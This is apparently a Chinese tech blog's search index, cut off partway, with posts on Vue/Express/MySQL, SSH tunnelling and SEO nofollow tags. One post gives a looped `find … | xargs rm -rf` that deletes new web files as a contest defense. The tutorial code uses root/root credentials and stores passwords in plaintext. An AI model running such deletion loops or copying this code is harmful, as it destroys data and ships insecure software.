<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[Vue 利用 Express 结合 MySQL 或者 MongoDB]]></title>
      <url>/2017/09/vuejs-and-express-mysql-or-mongodb/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>使用 vue-cli 脚手架工具创建一个基于 webpack 的 Vue 项目本身已经包含了 Express，但是项目若需要结合 MySQL 或者 MongoDB，还需折腾一番<a id="more"></a></p><h1 id="构建-Vue-项目"><a href="#构建-Vue-项目" class="headerlink" title="构建 Vue 项目"></a>构建 Vue 项目</h1><blockquote><p>前提：安装 <strong>node.js</strong> 环境</p></blockquote><h2 id="安装-vue-cli"><a href="#安装-vue-cli" class="headerlink" title="安装 vue-cli"></a>安装 vue-cli</h2><pre><code class="bash">npm install -g vue-cli
</code></pre><h2 id="一个基于-webpack-的-Vue-项目"><a href="#一个基于-webpack-的-Vue-项目" class="headerlink" title="一个基于 webpack 的 Vue 项目"></a>一个基于 webpack 的 Vue 项目</h2><pre><code class="bash">vue init webpack [project-name]
cd [project-name]
npm install
</code></pre><h2 id="使用-vue-resource-请求数据"><a href="#使用-vue-resource-请求数据" class="headerlink" title="使用 vue-resource 请求数据"></a>使用 vue-resource 请求数据</h2><pre><code class="bash">npm install --save vue-resource
</code></pre><p>在你的 <code>src/main.js</code> 适当位置添加以下代码</p><pre><code class="javascript">import VueResource from &#39;vue-resource&#39;
Vue.use(VueResource)
</code></pre><h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h2 id="添加-Express-服务端目录"><a href="#添加-Express-服务端目录" class="headerlink" title="添加 Express 服务端目录"></a>添加 Express 服务端目录</h2><blockquote><p>前提：安装 <strong>MySQL</strong> 数据库</p></blockquote><p>在项目根文件夹下创建一个 server 文件夹。然后里面创建下面几个文件夹及文件</p><pre><code class="bash">|-- server
  |-- bin
    |-- www.js      =&gt; Express 服务器入口文件
  |-- config
    |-- db.js       =&gt; MySQL 数据库配置文件
  |-- map
    |-- sqlMap.js   =&gt; SQL 语句存储文件
  |-- router
    |-- userApi.js  =&gt; 数据库操作文件
</code></pre><h3 id="www-js"><a href="#www-js" class="headerlink" title="www.js"></a>www.js</h3><pre><code class="javascript">const fs = require(&#39;fs&#39;)
const path = require(&#39;path&#39;)
const bodyParser = require(&#39;body-parser&#39;)
const express = require(&#39;express&#39;)
const app = express()

const userApi = require(&#39;../router/userApi&#39;)

app.use(bodyParser.json())
app.use(bodyParser.urlencoded({
  extended: false
}))

// 后端api路由
app.use(&#39;/api/user&#39;, userApi)

// 监听端口
app.listen(3000)
console.log(&#39;success listen at port:3000......&#39;)
</code></pre><h3 id="db-js"><a href="#db-js" class="headerlink" title="db.js"></a>db.js</h3><pre><code class="javascript">// 数据库连接配置
module.exports = {
  mysql: {
    host: &#39;127.0.0.1&#39;,
    user: &#39;root&#39;,
    password: &#39;root&#39;,
    database: &#39;test&#39;,
    port: &#39;3306&#39;
  }
}
</code></pre><h3 id="sqlMap-js"><a href="#sqlMap-js" class="headerlink" title="sqlMap.js"></a>sqlMap.js</h3><pre><code class="javascript">// sql语句
const sqlMap = {
  // 用户
  user: {
    add: &#39;insert into users(`id`, `user_id`, `user_pwd`) values (NULL, ?, ?)&#39;
  }
}

module.exports = sqlMap
</code></pre><h3 id="userApi-js"><a href="#userApi-js" class="headerlink" title="userApi.js"></a>userApi.js</h3><pre><code class="javascript">const models = require(&#39;../config/db&#39;)
const express = require(&#39;express&#39;)
const router = express.Router()
const mysql = require(&#39;mysql&#39;)
const $sql = require(&#39;../map/sqlMap&#39;)

// 连接数据库
const conn = mysql.createConnection(models.mysql)

conn.connect()
const jsonWrite = (res, ret) =&gt; {
  if (typeof ret === &#39;undefined&#39;) {
    res.json({
      code: &#39;1&#39;,
      msg: &#39;操作失败&#39;
    })
  } else {
    res.json(ret)
  }
}

// 增加用户接口
router.post(&#39;/addUser&#39;, (req, res) =&gt; {
  var sql = $sql.user.add
  var params = req.body
  console.log(params)
  conn.query(sql, [params.user_id, params.user_pwd], (err, result) =&gt; {
    if (err) {
      console.log(err)
    }
    if (result) {
      jsonWrite(res, result)
    }
  })
})

module.exports = router
</code></pre><h2 id="添加-scripts-到-package-json"><a href="#添加-scripts-到-package-json" class="headerlink" title="添加 scripts 到 package.json"></a>添加 scripts 到 package.json</h2><pre><code class="json">&quot;scripts&quot;: {
  &quot;server&quot;: &quot;nodemon ./server/bin/www.js&quot;,
}
</code></pre><blockquote><p>注意到 package.json 中的 nodemon，这是热加载插件，就是有新文件的创建或者有新增代码，将会重新启动 Express 服务</p></blockquote><h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><pre><code class="bash">npm install --save nodemon mysql body-parser
</code></pre><h1 id="编写-vue-测试文件"><a href="#编写-vue-测试文件" class="headerlink" title="编写 vue 测试文件"></a>编写 vue 测试文件</h1><pre><code class="html">&lt;template&gt;
  &lt;div class=&quot;hello&quot;&gt;
    &lt;h1&gt;{{ msg }}&lt;/h1&gt;
    &lt;form&gt;
      &lt;input type=&quot;text&quot; name=&quot;user_id&quot; v-model=&quot;user_id&quot; placeholder=&quot;Enter your ID&quot;&gt; &lt;br&gt;
      &lt;input type=&quot;password&quot; name=&quot;user_pwd&quot; v-model=&quot;user_id&quot; placeholder=&quot;Enter your password&quot;&gt; &lt;br&gt;
      &lt;a href=&quot;javascript:;&quot; @click=&quot;addUser&quot;&gt;提交&lt;/a&gt;
    &lt;/form&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
export default {
  name: &#39;hello&#39;,
  data () {
    return {
      msg: &#39;Welcome to Your Vue.js App&#39;,
      user_id: &#39;&#39;,
      user_pwd: &#39;&#39;
    }
  },
  methods: {
    addUser() {
      var userId = this.user_id;
      var userPwd = this.user_pwd;
      this.$http.post(&#39;/api/user/addUser&#39;, {
        user_id: userId,
        user_pwd: userPwd
      }).then((response) =&gt; {
        console.log(response);
      })
    }
  }
}
&lt;/script&gt;
</code></pre><h1 id="设置代理与跨域"><a href="#设置代理与跨域" class="headerlink" title="设置代理与跨域"></a>设置代理与跨域</h1><p>完成上面步骤之后，执行 <code>npm run dev</code>，然后输入一组数据，点击保存，你会发现会报一个错误：<code>vue-resource.common.js?e289:1071 POST http://localhost:8080/api/use... 404 (Not Found)</code>。这是由于直接访问 8080 端口，是访问不到的，所以这里需要设置一下代理转发映射.</p><p>项目根目录下的 config 文件夹中有一个 proxyTable 参数，用来设置地址映射表，可以添加到开发时配置（dev）中</p><h2 id="config-index-js"><a href="#config-index-js" class="headerlink" title="config/index.js"></a>config/index.js</h2><pre><code class="javascript">dev: {
  // ...
  proxyTable: {
    &#39;/api&#39;: {
      target: &#39;http://127.0.0.1:3000/api/&#39;,
      changeOrigin: true,
      pathRewrite: {
          &#39;^/api&#39;: &#39;&#39;
      }
    }
  },
  // ...
}
</code></pre><p>添加以上代码之后，请求 <code>/api</code> 时就代表 <code>http://127.0.0.1:3000/api/</code>(这里要写 ip，不要写 localhost)， changeOrigin 参数接收一个布尔值，如果为 true，这样就不会有跨域问题了。</p><h1 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h1><pre><code class="bash">npm run dev
npm run server
</code></pre><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> vue </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Node.js </tag>
            
            <tag> MongoDB </tag>
            
            <tag> MySQL </tag>
            
            <tag> Vue </tag>
            
            <tag> Express </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Shell 监听脚本：新增文件]]></title>
      <url>/2017/08/shell-listen-for-new-files/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>Liunx 下的监听 shell 脚本，脚本功能实现，当一小时内有新增的新文件，立刻删除它，此脚本允许被后台运行<a id="more"></a></p><h1 id="功能解释"><a href="#功能解释" class="headerlink" title="功能解释"></a>功能解释</h1><ol><li>若含有文件上传漏洞时，该脚本能够自动删除上传的文件</li><li>在 <code>PWD(攻防对抗)</code> 中非常有用</li><li>后台运行，只占用进程号，不占用 shell 界面</li></ol><h1 id="脚本代码"><a href="#脚本代码" class="headerlink" title="脚本代码"></a>脚本代码</h1><pre><code class="shell">#!/bin/bash
while true
do
  find /var/www/dvwa/ -cmin -60 -type f | xargs rm -rf
  sleep 1
done
</code></pre><h2 id="脚本解释"><a href="#脚本解释" class="headerlink" title="脚本解释"></a>脚本解释</h2><ul><li><code>while true</code> =&gt; 持续监听</li><li><code>-cmin -60</code> =&gt; 查找一小时内（包含一小时）新增文件</li><li><code>-type f</code> =&gt; 制定文件类型为文件</li><li><code>|</code> =&gt; 管道符，将前一个命令执行结果传送至后一个命令执行</li><li><code>xargs</code> =&gt; 命令传递参数的一个过滤器，可以批量执行</li><li><code>sleep 1</code> =&gt; 上一条命令执行之后，暂停 1 秒</li><li><code>/var/www/dvwa/</code> =&gt; 可为任何目录，这边是一个测试目录</li></ul><h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><pre><code class="bash">chmod +x [fileName].sh
./[fileName].sh &amp;
</code></pre><h2 id="进程号查询"><a href="#进程号查询" class="headerlink" title="进程号查询"></a>进程号查询</h2><p>脚本后台运行时，会生成一个进程号<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/shell-new-files-1.png" alt="Shell 监听脚本"></p><p>通过 ps 命令可以查询进程<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/shell-new-files-2.png" alt="Shell 监听脚本"></p><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><h2 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h2><p>在 <code>/var/www/dvwa/</code> 某个目录下新增文件<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/shell-new-files-3.png" alt="Shell 监听脚本"></p><h2 id="在有上传文件漏洞中测试"><a href="#在有上传文件漏洞中测试" class="headerlink" title="在有上传文件漏洞中测试"></a>在有上传文件漏洞中测试</h2><p>在 dvwa 中的上传文件漏洞环境进行测试<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/shell-new-files-4.png" alt="Shell 监听脚本"></p><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> pentest </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Security </tag>
            
            <tag> Code </tag>
            
            <tag> Shell </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[浅谈 SSH 服务]]></title>
      <url>/2017/08/talk-ssh-service/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>SSH 是每一台 Linux 系统的标准配置服务，本文将总结 SSH 的常见用法<a id="more"></a></p><h1 id="什么是-SSH"><a href="#什么是-SSH" class="headerlink" title="什么是 SSH"></a>什么是 SSH</h1><p>SSH 为 <code>Secure Shell</code> 的缩写，中文名字为安全外壳协议。SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。需要指出的是，SSH 只是一种协议，存在多种实现，既有商业实现，也有开源实现。</p><h1 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h1><p>SSH 主要用于远程登录，只要一条简单命令就可以了。</p><pre><code class="bash">ssh [userName]@[hostIP]
</code></pre><p>如果本地用户名与远程用户名一致，登录时可以省略用户名。</p><pre><code class="bash">ssh [hostIP]
</code></pre><p>SSH 的默认端口是 22，当然也可以使用 <code>-p</code> 修改这个端口。</p><pre><code class="bash">ssh -p [port] [userName]@[hostIP]
</code></pre><h1 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h1><p>SSH 之所以能够保证安全，原因在于它采用了公钥加密。</p><p>整个过程是这样的：</p><ul><li>远程主机收到用户的登录请求，把自己的公钥发给用户。</li><li>用户使用这个公钥，将登录密码加密后，发送回来。</li><li>远程主机用自己的私钥，解密登录密码，如果密码正确，就同意用户登录。</li></ul><p>这个过程本身是安全的，但是实施的时候存在一个风险：如果有人截获了登录请求，然后冒充远程主机，将伪造的公钥发给用户，那么用户很难辨别真伪。因为不像 https 协议，SSH 协议的公钥是没有证书中心（CA）公证的，也就是说，都是自己签发的。</p><p>可以设想，如果攻击者插在用户与远程主机之间（比如在公共的 wifi 区域），用伪造的公钥，获取用户的登录密码。再用这个密码登录远程主机，那么 SSH 的安全机制就荡然无存了。</p><p>这种风险就是著名的<a href="//en.wikipedia.org/wiki/Man-in-the-middle_attack">“中间人攻击”</a>（Man-in-the-middle attack）。</p><h1 id="口令登录"><a href="#口令登录" class="headerlink" title="口令登录"></a>口令登录</h1><p>如果你是第一次登录对方主机，系统会出现下面的提示：</p><blockquote><p>The authenticity of host ‘host (12.18.429.21)’ can’t be established.<br><br>RSA key fingerprint is 98:2e:d7:e0:de:9f:ac:67:28:c2:42:2d:37:16:58:4d.<br><br>Are you sure you want to continue connecting (yes/no)?<br></p></blockquote><p>这段话的意思是，无法确认 host 主机的真实性，只知道它的公钥指纹，问你还想继续连接吗？</p><p>所谓”公钥指纹”，是指公钥长度较长（这里采用 RSA 算法，长达 1024 位），很难比对，所以对其进行 MD5 计算，将它变成一个 128 位的指纹。上例中是 <code>98:2e:d7:e0:de:9f:ac:67:28:c2:42:2d:37:16:58:4d</code>，再进行比较，就容易多了。</p><p>很自然的一个问题就是，用户怎么知道远程主机的公钥指纹应该是多少？回答是没有好办法，远程主机必须在自己的网站上贴出公钥指纹，以便用户自行核对。</p><p>假定经过风险衡量以后，用户决定接受这个远程主机的公钥。</p><blockquote><p>Are you sure you want to continue connecting (yes/no)? yes</p></blockquote><p>系统会出现一句提示，表示 host 主机已经得到认可。</p><blockquote><p>Warning: Permanently added ‘host,12.18.429.21’ (RSA) to the list of known hosts.</p></blockquote><p>然后，会要求输入密码。</p><blockquote><p>Password: (enter password)</p></blockquote><p>如果密码正确，就可以登录了。</p><p>当远程主机的公钥被接受以后，它就会被保存在文件 <code>$HOME/.ssh/known_hosts</code> 之中。下次再连接这台主机，系统就会认出它的公钥已经保存在本地了，从而跳过警告部分，直接提示输入密码。</p><p>每个 SSH 用户都有自己的 <code>known_hosts</code> 文件，此外系统也有一个这样的文件，通常是 <code>/etc/ssh/ssh_known_hosts</code>，保存一些对所有用户都可信赖的远程主机的公钥。</p><h1 id="公钥登录"><a href="#公钥登录" class="headerlink" title="公钥登录"></a>公钥登录</h1><p>使用密码登录，每次都必须输入密码，非常麻烦。好在 SSH 还提供了公钥登录，可以省去输入密码的步骤。</p><p>所谓”公钥登录”，原理很简单，就是用户将自己的公钥储存在远程主机上。登录的时候，远程主机会向用户发送一段随机字符串，用户用自己的私钥加 密后，再发回来。远程主机用事先储存的公钥进行解密，如果成功，就证明用户是可信的，直接允许登录 shell，不再要求密码。</p><p>这种方法要求用户必须提供自己的公钥。如果没有现成的，可以直接用 ssh-keygen 生成一个：</p><pre><code class="bash">ssh-keygen
</code></pre><p>运行上面的命令以后，系统会出现一系列提示，可以一路回车。其中有一个问题是，要不要对私钥设置口令（passphrase），如果担心私钥的安全，这里可以设置一个。</p><p>运行结束以后，在 <code>$HOME/.ssh/</code> 目录下，会新生成两个文件：<code>id_rsa.pub</code> 和 <code>id_rsa</code>。前者是你的公钥，后者是你的私钥。</p><p>这时再输入下面的命令，将公钥传送到远程主机 host 上面：</p><pre><code class="bash">ssh-copy-id [userName]@[hostIP]
</code></pre><p>好了，从此你再登录，就不需要输入密码了。</p><h1 id="authorized-keys-文件"><a href="#authorized-keys-文件" class="headerlink" title="authorized_keys 文件"></a>authorized_keys 文件</h1><p>远程主机将用户的公钥，保存在登录后的用户主目录的 <code>$HOME/.ssh/authorized_keys</code> 文件中。公钥就是一段字符串，只要把它追加在 authorized_keys 文件的末尾就行了。</p><p>这里不使用上面的 <code>ssh-copy-id</code> 命令，改用下面的命令，解释公钥的保存过程：</p><pre><code class="bash">ssh [userName]@[hostIP] &#39;mkdir .ssh &amp;&amp; cat &gt;&gt; .ssh/authorized_keys&#39; &lt; ~/.ssh/id_rsa.pub
</code></pre><p>这条命令由多个语句组成，依次分解开来看：</p><ul><li><strong><code>ssh [userName]@[hostIP]</code></strong>，表示登录远程主机</li><li>单引号中的 <strong><code>mkdir .ssh &amp;&amp; cat &gt;&gt; .ssh/authorized_keys</code></strong>，表示登录后在远程 shell 上执行的命令</li><li><strong><code>mkdir .ssh</code></strong> 的作用是，如果用户主目录中的 .ssh 目录不存在，就创建一个</li><li><strong><code>cat &gt;&gt; .ssh/authorized_keys&#39; &lt; ~/.ssh/id_rsa.pub</code></strong> 的作用是，将本地的公钥文件 <code>~/.ssh/id_rsa.pub</code>，重定向追加到远程文件 authorized_keys 的末尾。</li></ul><p>写入 authorized_keys 文件后，公钥登录的设置就完成了。</p><h1 id="远程操作"><a href="#远程操作" class="headerlink" title="远程操作"></a>远程操作</h1><pre><code class="bash">ssh [userName]@[hostIP] &#39;mkdir .ssh &amp;&amp; cat &gt;&gt; .ssh/authorized_keys&#39; &lt; ~/.ssh/id_rsa.pub
</code></pre><p>单引号中间的部分，表示在远程主机上执行的操作；后面的输入重定向，表示数据通过 SSH 传向远程主机。</p><p>这就是说，SSH 可以在用户和远程主机之间，建立命令和数据的传输通道，因此很多事情都可以通过 SSH 来完成。</p><h2 id="【例1】"><a href="#【例1】" class="headerlink" title="【例1】"></a>【例1】</h2><p>将 <code>$HOME/src/</code> 目录下面的所有文件，复制到远程主机的 <code>$HOME/src/</code> 目录。</p><pre><code class="bash">cd &amp;&amp; tar czv src ssh [userName]@[hostIP] &#39;tar xz&#39;
</code></pre><h2 id="【例2】"><a href="#【例2】" class="headerlink" title="【例2】"></a>【例2】</h2><p>将远程主机 <code>$HOME/src/</code> 目录下面的所有文件，复制到用户的当前目录。</p><pre><code class="bash">ssh [userName]@[hostIP] &#39;tar cz src&#39; tar xzv
</code></pre><h2 id="【例3】"><a href="#【例3】" class="headerlink" title="【例3】"></a>【例3】</h2><p>查看远程主机是否运行进程 httpd。</p><pre><code class="bash">ssh [userName]@[hostIP] &#39;ps ax grep [h]ttpd&#39;
</code></pre><h1 id="绑定本地端口"><a href="#绑定本地端口" class="headerlink" title="绑定本地端口"></a>绑定本地端口</h1><p>既然 SSH 可以传送数据，那么我们可以让那些不加密的网络连接，全部改走 SSH 连接，从而提高安全性。</p><p>假定我们要让 8080 端口的数据，都通过 SSH 传向远程主机，命令就这样写：</p><pre><code class="bash">ssh -D 8080 [userName]@[hostIP]
</code></pre><p>SSH 会建立一个 socket，去监听本地的 8080 端口。一旦有数据传向那个端口，就自动把它转移到 SSH 连接上面，发往远程主机。可以想象，如果 8080 端口原来是一个不加密端口，现在将变成一个加密端口。</p><h1 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h1><p>有时，绑定本地端口还不够，还必须指定数据传送的目标主机，从而形成点对点的”端口转发”。为了区别后文的”远程端口转发”，我们把这种情况称为”本地端口转发”（Local forwarding）。</p><p>假定 host1 是本地主机，host2是远程主机。由于种种原因，这两台主机之间无法连通。但是，另外还有一台 host3，可以同时连通前面两台主机。因此，很自然的想法就是，通过 host3，将 host1 连上 host2。</p><p>我们在 host1 执行下面的命令：</p><pre><code class="bash">ssh -L 2121:[host2IP]:21 [host3IP]
</code></pre><p>命令中的L参数一共接受三个值，分别是”本地端口:目标主机:目标主机端口”，它们之间用冒号分隔。这条命令的意思，就是指定 SSH 绑定本地端口 2121，然后指定 host3 将所有的数据，转发到目标主机 host2 的 21 端口（假定 host2 运行 FTP，默认端口为 21）。</p><p>这样一来，我们只要连接 host1 的 2121 端口，就等于连上了 host2 的 21 端口。</p><pre><code class="bash">ftp localhost:2121
</code></pre><p>“本地端口转发”使得 host1 和 host3 之间仿佛形成一个数据传输的秘密隧道，因此又被称为”SSH 隧道”。</p><h1 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a>远程端口转发</h1><p>既然”本地端口转发”是指绑定本地端口的转发，那么”远程端口转发”（remote forwarding）当然是指绑定远程端口的转发。</p><p>还是接着看上面那个例子，host1与 host2 之间无法连通，必须借助 host3 转发。但是，特殊情况出现了，host3是一台内网机器，它可以连接外网的 host1，但是反过来就不行，外网的 host1 连不上内网的 host3。这时，”本地端口转发”就不能用了，怎么办？</p><p>解决办法是，既然 host3 可以连 host1，那么就从 host3 上建立与 host1 的 SSH 连接，然后在 host1 上使用这条连接就可以了。</p><p>我们在 host3 执行下面的命令：</p><pre><code class="bash">ssh -R 2121:[host2IP]:21 [host1IP]
</code></pre><p>R 参数也是接受三个值，分别是”远程主机端口:目标主机:目标主机端口”。这条命令的意思，就是让 host1 监听它自己的 2121 端口，然后将所有数据经由 host3，转发到 host2 的 21 端口。由于对于 host3 来说，host1是远程主机，所以这种情况就被称为”远程端口绑定”。</p><p>绑定之后，我们在 host1 就可以连接 host2 了：</p><pre><code class="bash">ftp localhost:2121
</code></pre><p>这里必须指出，”远程端口转发”的前提条件是，host1和 host3 两台主机都有 sshD 和 ssh 客户端。</p><h1 id="SHH-的其他参数"><a href="#SHH-的其他参数" class="headerlink" title="SHH 的其他参数"></a>SHH 的其他参数</h1><p>SSH 还有一些别的参数，也值得介绍。</p><p>N 参数，表示只连接远程主机，不打开远程 shell；T参数，表示不为这个连接分配 TTY。这个两个参数可以放在一起用，代表这个 SSH 连接只用来传数据，不执行远程操作。</p><pre><code class="bash">ssh -NT -D 8080 [hostIP]
</code></pre><p>f 参数，表示 SSH 连接成功后，转入后台运行。这样一来，你就可以在不中断 SSH 连接的情况下，在本地 shell 中执行其他操作。</p><pre><code class="bash">ssh -f -D 8080 [hostIP]
</code></pre><p>要关闭这个后台连接，就只有用 kill 命令去杀掉进程。</p><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> liunx </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Security </tag>
            
            <tag> Service </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Nofollow 正确使用方式]]></title>
      <url>/2017/07/nofollow-proper-use-of-the-way/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>有的网站内容比较的重要，不希望别人所知道，同时也防止一些无聊的 SEO 站长特意灌水，发一些无关的信息，所以最佳解决方式是设置 Nofollow<a id="more"></a></p><h1 id="Nofollow-的作用"><a href="#Nofollow-的作用" class="headerlink" title="Nofollow 的作用"></a>Nofollow 的作用</h1><ol><li>禁止爬取带有 Nofollow 标识的内容。</li><li>不额外传递网站页面或者整个网站权重。</li><li>为互联网打造舒适健康的网络环境。</li></ol><h1 id="Nofollow-正确使用方法"><a href="#Nofollow-正确使用方法" class="headerlink" title="Nofollow 正确使用方法"></a>Nofollow 正确使用方法</h1><h2 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h2><blockquote><p>通常将 nofollow 写在 head 区域，也就是写在 meta 标签上面，等于告诉爬虫不要抓取网页上所有标内外部链接。</p></blockquote><pre><code class="html">&lt;meta name=&quot;robots&quot; content=&quot;nofollow&quot; /&gt;
</code></pre><h2 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h2><blockquote><p>上面一种有所差别，此时他是属于超文本链接的的一个属性值，也就是超链接 a 标签，并且带上 rel=”nofollow”</p></blockquote><pre><code class="html">&lt;a rel=&quot;nofollow&quot; href=&quot;&quot;&gt;&lt;/a&gt;
</code></pre><h2 id="Nofollow-的其他一些写法"><a href="#Nofollow-的其他一些写法" class="headerlink" title="Nofollow 的其他一些写法"></a>Nofollow 的其他一些写法</h2><ul><li><strong>index</strong> 指令：告诉搜索引擎抓取这个页面</li><li><strong>follow</strong> 指令：告诉搜索引擎可以从这个页面上找到链接，然后继续访问抓取下去。</li><li><strong>noindex</strong> 指令：告诉搜索引擎不允许抓取这个页面</li><li><strong>nofollow</strong> 指令：告诉搜索引擎不允许从此页找到链接、拒绝其继续访问。</li></ul><p>根据以上的指令，我们就有了以下的四种组合</p><h3 id="组合一"><a href="#组合一" class="headerlink" title="组合一"></a>组合一</h3><blockquote><p>可以抓取本页，而且可以顺着本页继续索引别的链接</p></blockquote><pre><code class="html">&lt;meta name=&quot;robots&quot; content=&quot;index,follow&quot;&gt;
</code></pre><h3 id="组合二"><a href="#组合二" class="headerlink" title="组合二"></a>组合二</h3><blockquote><p>不许抓取本页，但是可以顺着本页抓取索引别的链接</p></blockquote><pre><code class="html">&lt;meta name=&quot;robots&quot; content=&quot;noindex,follow&quot;&gt;
</code></pre><h3 id="组合三"><a href="#组合三" class="headerlink" title="组合三"></a>组合三</h3><blockquote><p>可以抓取本页，但是不许顺着本页抓取索引别的链接</p></blockquote><pre><code class="html">&lt;meta name=&quot;robots&quot; content=&quot;index,nofollow&quot;&gt;
</code></pre><h3 id="组合四"><a href="#组合四" class="headerlink" title="组合四"></a>组合四</h3><blockquote><p>不许抓取本页，也不许顺着本页抓取索引别的链接</p></blockquote><pre><code class="html">&lt;meta name=&quot;robots&quot; content=&quot;noindex,nofollow&quot;&gt;
</code></pre><h3 id="错误写法"><a href="#错误写法" class="headerlink" title="错误写法"></a>错误写法</h3><p>不要把两个对立的反义词写到一起，例如：</p><pre><code class="html">&lt;meta name=&quot;robots&quot; content=&quot;index,noindex&quot;&gt;
&lt;!-- 或 --&gt;
&lt;meta name=&quot;robots&quot; content=&quot;follow,nofollow&quot;&gt;
</code></pre><h3 id="简写方式"><a href="#简写方式" class="headerlink" title="简写方式"></a>简写方式</h3><p>此外对于多命令，这里有一个简便的写法， 如果是</p><pre><code class="html">&lt;meta name=&quot;robots&quot; content=&quot;index,follow&quot;&gt;
</code></pre><p>的形式的话，可以写成：</p><pre><code class="html">&lt;meta name=&quot;robots&quot; content=&quot;all&quot;&gt;
</code></pre><p>如果是</p><pre><code class="html">&lt;meta name=&quot;robots&quot; content=&quot;noindex,nofollow&quot;&gt;
</code></pre><p>的形式的话，可以写成：</p><pre><code class="html">&lt;meta name=&quot;robots&quot; content=&quot;none&quot;&gt;
</code></pre><h1 id="禁止搜索引擎建立快照"><a href="#禁止搜索引擎建立快照" class="headerlink" title="禁止搜索引擎建立快照"></a>禁止搜索引擎建立快照</h1><blockquote><p>网站快照指的是搜索引擎（如百度，google 等）在抓取网站数据的时候，对网页进行的一种缓存处理，方便用户遇到网站打不开的时候，也能正常查看网站的资料，而且网站快照还能告诉站长这个网站在搜索引擎上的更新时间，当然了，快照的时间并不等于网站更新的时间。</p></blockquote><h2 id="限制所有的搜索引擎建立快照"><a href="#限制所有的搜索引擎建立快照" class="headerlink" title="限制所有的搜索引擎建立快照"></a>限制所有的搜索引擎建立快照</h2><pre><code class="html">&lt;meta name=&quot;robots&quot; content=&quot;noarchive&quot;&gt;
</code></pre><h2 id="仅限制某个搜索引擎"><a href="#仅限制某个搜索引擎" class="headerlink" title="仅限制某个搜索引擎"></a>仅限制某个搜索引擎</h2><pre><code class="html">&lt;meta name=&quot;Googlebot&quot; content=&quot;noarchive&quot;&gt; &lt;!-- 限制谷歌搜索引擎 --&gt;
&lt;meta name=&quot;Baiduspider&quot; content=&quot;noarchive&quot;&gt; &lt;!-- 限制百度搜索引擎 --&gt;
</code></pre><h2 id="其他写法"><a href="#其他写法" class="headerlink" title="其他写法"></a>其他写法</h2><p>如果是对于单独的某个搜索引擎不允许建立快照且限制爬虫爬取链接方式，例如谷歌，我们就可以写成：</p><pre><code class="html">&lt;meta name=&quot;googlebot&quot; content=&quot;index,follow,noarchive&quot;&gt;
</code></pre><p>如果设置成 archive 当然是允许建立快照，默认的也是如此</p><pre><code class="html">&lt;meta name=&quot;robots&quot; content=&quot;index,follow, archive&quot;&gt;
</code></pre><h1 id="Nofollow-的缺点"><a href="#Nofollow-的缺点" class="headerlink" title="Nofollow 的缺点"></a>Nofollow 的缺点</h1><ol><li>Nofollow 的作用是告诫爬虫，该链接请你老人家不要爬取，也就意味着被添加上 Nofollow 标识的链接将失去传递权重的作用，从而避免了权重的流失或者被均摊。</li><li>Nofollow 标识并不能够避免权重的流失。如果你的页面具有 4 个链接，但是某一个链接添加上了 Nofollow 标识，这也就导致了原来每个占有25%的权重链接数量变成了 3 个，但是所有的链接还是原来的25%，并不会因为 Nofollow 标识的存在而实现权重的累积，也就意味着添加 Nofollow 标识的链接的群众不被考虑在内，方便蜘蛛能够在有限的时间内爬取收录更多的页面信息。</li><li>Nofollow 标识是交换友情链接的重要依据之一。众所周知，高权重友情链接的交换能够给彼此带来较高效果，因为相互传递权重支持，但是就有一些SEO站长耍点小聪明，为了一点点的私信，在链接上面添加上 Nofollow 标识，从而使彼此互助的友情链接成了单方面的支持，他的网站不给你传递权重，而你的网站却给他传递权重，这属于欺骗性行为，是一种很可耻的行为，还在现在各方面都很人性化，一般都能够检测到 Nofollow 标识。</li></ol><h1 id="Nofollow-和-External-nofollow-的区别"><a href="#Nofollow-和-External-nofollow-的区别" class="headerlink" title="Nofollow 和 External nofollow 的区别"></a>Nofollow 和 External nofollow 的区别</h1><blockquote><p>其实这两者没有什么区别，后者是前者的规范性写法，意思一样，效果一样。</p></blockquote><h1 id="Nofollow-使用之处"><a href="#Nofollow-使用之处" class="headerlink" title="Nofollow 使用之处"></a>Nofollow 